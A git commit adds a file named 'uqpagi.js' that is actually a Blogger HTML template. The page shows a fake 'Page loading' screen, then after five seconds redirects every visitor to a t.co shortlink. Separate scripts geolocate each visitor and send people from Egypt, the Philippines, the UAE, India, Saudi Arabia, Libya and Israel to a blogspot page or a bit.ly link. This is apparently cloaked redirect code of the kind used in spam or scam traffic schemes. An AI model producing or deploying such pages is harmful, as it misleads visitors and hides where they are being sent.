c884d85229146a58066c1bef14afe0805ad4a508
thwylat710 <84282918+thwylat710@users.noreply.github.com>
2021-09-11 02:22:12 +0200

    Add files via upload

---
+++ uqpagi.js
@@ -0,0 +1,140 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE HTML>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+  
+  
+  
+  <p style="text-align: center;"><b>&nbsp;جاري تحميل الصفحة</b></p><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-EAtqEddgMQ0/YTk4IcpKHfI/AAAAAAAAACA/io-7vVR6KVQuZZyyiPy3AV1KJ3gRd1DJQCLcBGAsYHQ/s300/loadbar.gif" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="24" data-original-width="300" height="24" src="https://1.bp.blogspot.com/-EAtqEddgMQ0/YTk4IcpKHfI/AAAAAAAAACA/io-7vVR6KVQuZZyyiPy3AV1KJ3gRd1DJQCLcBGAsYHQ/s0/loadbar.gif" width="300" /></a></div><p style="text-align: center;"><b>Page loading</b></p><p style="text-align: center;"><b><br /></b></p>
+
+
+
+<script type="text/javascript">
+var urls = new Array("https://t.co/EtRELQu476");
+
+function redirect()
+{
+    window.location = urls[Math.floor(urls.length*Math.random())];
+}
+var temp = setInterval("redirect()", 5000);
+</script>
+  
+  
+  
+  
+  
+  
+<script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'EG') {
+      window.location.replace("https://smartshopme.blogspot.com/p/eg.html");
+    }
+  })
+</script>
+  
+  <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'PH') {
+      window.location.replace("https://bit.ly/2YN0GRx");
+    }
+  })
+</script>
+  
+  <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'AE') {
+      window.location.replace("https://bit.ly/2YN0GRx");
+    }
+  })
+</script>
+  
+    <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'IN') {
+      window.location.replace("https://bit.ly/2YN0GRx");
+    }
+  })
+</script>
+  
+  
+      <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'SA') {
+      window.location.replace("https://bit.ly/2YN0GRx");
+    }
+  })
+</script>
+  
+
+          <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'LY') {
+      window.location.replace("https://bit.ly/2YN0GRx");
+    }
+  })
+</script>
+  
+            <script>
+  fetch('https://freegeoip.app/json/')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    if(data.country_code == 'IL') {
+      window.location.replace("https://bit.ly/2YN0GRx");
+    }
+  })
+</script>
+  
+  
+  
+    <b:include data='blog' name='all-head-content'/>
+    <title><data:blog.pageTitle/></title>
+
+<b:skin><![CDATA[/*
+-----------------------------------------------
+Blogger Template Style
+Name:     abduallah mnqush
+Designer: https://abduallah0.blogspot.com
+----------------------------------------------- */
+
+
+
+
+
+]]></b:skin>
+
+
+</head>
+<body>
+
+  <b:section id='all'/>
+
+
+
+</body>
+</html>
